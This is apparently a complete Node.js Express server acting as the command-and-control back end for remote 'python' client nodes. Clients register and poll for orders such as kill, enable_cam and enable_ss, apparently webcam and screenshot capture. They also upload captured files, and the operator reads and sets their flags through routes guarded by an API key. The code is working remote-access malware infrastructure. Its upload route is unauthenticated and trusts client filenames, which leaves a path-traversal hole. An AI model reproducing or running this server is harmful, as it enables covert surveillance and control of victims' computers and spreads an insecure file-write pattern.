const express = require("express");
const path = require("path");
const app = express();
const fs = require("fs");
const busboy = require("connect-busboy");
const random = require("random-number").generator({
  min: 100000000,
  max: 999999999,
  integer: true
});

var node_list = [];
const apikey = process.env["GLOBAL_KEY"] || 0;
app.use(busboy());
const port = process.env.PORT || 80;
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json({ limit: "1mb" }));
app.listen(port, () => {
  console.log("listening to port : ", port);
  console.log("server started");
});
var mime = {
  html: "text/html",
  txt: "text/plain",
  css: "text/css",
  gif: "image/gif",
  jpg: "image/jpeg",
  png: "image/png",
  svg: "image/svg+xml",
  js: "application/javascript"
};

app.get("/", (req, res) => {
  res.send("fuck off");
});

app.post("/python/", (req, res) => {
  console.log("new file coming in");
  req.pipe(req.busboy);
  req.busboy.on("file", function(fieldname, file, filename) {
    console.log("Uploading: " + filename);
    var fstream;
    var endLoc = "/images/" + filename;
    var writeDir = path.join(__dirname, endLoc);
    fstream = fs.createWriteStream(writeDir);
    file.pipe(fstream);
    fstream.on("close", function() {
      console.log("saved");
      res.send("i got it");
    });
  });
});

app.get("/images/:filename/:key", (req, res) => {
  if (req.params.key == apikey) {
    const filename = req.params.filename;
    var fstream = fs.createReadStream(
      path.join(__dirname, "/images/" + filename)
    );
    var type = mime[path.extname(filename).slice(1)] || "text/plain";
    fstream.on("open", () => {
      res.set("content-type", type);
      fstream.pipe(res);
    });
    fstream.on("error", function() {
      res.set("Content-Type", "text/plain");
      res.status(404).end("Not found");
    });
  }
});

app.get("/python/connect/:node_name", (req, res) => {
  console.log(req.params.node_name, " connected");
  const data = generateNodeData(req.params.node_name);
  node_list.push(data);
  res.send({ id: data.id });
});

app.get("/python/disconnect/:id", (req, res) => {
  removeNode(req.params.id);
  res.send("ok");
});

app.get("/python/start_up_status/:id", (req, res) => {
  // console.log(req.params.id);
  for (var i = 0; i < node_list.length; i++) {
    // console.log(node_list[i].id)
    if (node_list[i].id == req.params.id) {
      res.send({ startup: node_list[i].startup });
    }
  }
});

app.get("/python/update_status/:id", (req, res) => {
  for (var i = 0; i < node_list.length; i++) {
    if (node_list[i].id == req.params.id) {
      node_list[i].is_connected = "true";
      node_list[i].status_g = "true";
      const message = node_list[i].message;
      node_list[i].message = "";
      res.send({
        kill: node_list[i].kill,
        enable_cam: node_list[i].enable_cam,
        enable_ss: node_list[i].enable_ss,
        message: message
      });
    }
  }
});

app.get("/set_status/:id/:info/:status/:key", (req, res) => {
  console.log(req.params.id)
  console.log(req.params.info)
  console.log(req.params.status)
  if (req.params.key == apikey) {
    for (var i = 0; i < node_list.length; i++) {
      if (node_list[i].id == req.params.id) {
        if (node_list[i][req.params.info] != undefined) {
          node_list[i][req.params.info] = req.params.status;
          res.send("ok");
        } else {
          break;
        }
      }
    }
  }
  res.end();
});

app.post("/send_message/:id/:key", (req, res) => {
  console.log(`sending '${req.body.info}' as message to ${req.params.id}`)
  if (req.params.key == apikey) {
    for (var i = 0; i < node_list.length; i++) {
      if (node_list[i].id == req.params.id) {
        node_list[i].message = req.body.info;
        res.status(200).send("ok");
        break;
      }
    }
  }
});

app.get("/info/:key", (req, res) => {
  if (req.params.key == apikey) {
    res.contentType("application/json");
    res.json(node_list);
  }
});

setInterval(check_nodes, 15000);

async function check_nodes() {
  node_list.forEach(element => {
    if (element.is_connected != "true") {
      //disconnect
      element.status_g = "false";
    } else {
      element.is_connected = "false";
    }
  });
}

function generateNodeData(node_name) {
  const id = random();
  node_list.forEach(element => {
    if (id == element.id) {
      id = random();
    }
  });
  return {
    id: id,
    name: node_name,
    startup: "true",
    kill: "false",
    enable_cam: "false",
    enable_ss: "false",
    is_connected: "true",
    status_g: "true",
    message: ""
  };
}

async function removeNode(id) {
  node_list.forEach(element => {
    if (id == element.id) {
      console.log(element.name, " disconnected");
      node_list.splice(node_list.indexOf(element), 1);
    }
  });
}
